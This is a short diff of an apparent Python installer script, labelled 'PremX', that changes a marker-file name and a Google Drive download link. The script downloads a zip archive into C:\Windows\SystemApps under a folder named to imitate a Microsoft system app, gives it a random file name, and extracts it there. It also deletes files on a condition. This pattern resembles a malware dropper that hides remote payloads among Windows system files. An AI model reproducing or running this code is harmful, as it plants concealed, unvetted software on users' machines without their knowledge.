@@ -35,7 +35,7 @@ def delete_files_if_condition(file):
                         os.remove(file_path)
                 except Exception as e:
                     print(f"")
-check_file = r"C:\Windows\System32\premxupdatemay012025vc1.txt"
+check_file = r"C:\Windows\System32\premxupdatejune2006.txt"
 delete_files_if_condition(check_file)
 
 
@@ -73,7 +73,7 @@ if not os.path.exists("C:\\Windows\\System32\\DSEL\\klx2025.py"):
 if not os.path.exists("C:\\Windows\\SystemApps\\Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewy1h2txyeX\\csklxzcgmletroipqsadfi.nsh"):
     os.system('cls')
     print("Installing PremX please wait. Part 2")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1So5_aAQEKV0fVgChL0sw1S3fhUhCeQy8", "C:\\Windows\\SystemApps\\Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewy1h2txyeX\\csklxzcgmletroipqsadfi.zip")
+    download_file_from_google_drive("https://drive.google.com/uc?id=1DzbaIA-I8J-WfYh6zYBsMkcb7692FGKT", "C:\\Windows\\SystemApps\\Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewy1h2txyeX\\csklxzcgmletroipqsadfi.zip")
     zip_file = r'C:\Windows\SystemApps\Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewy1h2txyeX\csklxzcgmletroipqsadfi.zip'
     extract_dir = r'C:\Windows\SystemApps\Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewy1h2txyeX'
     extract_zip(zip_file, extract_dir)
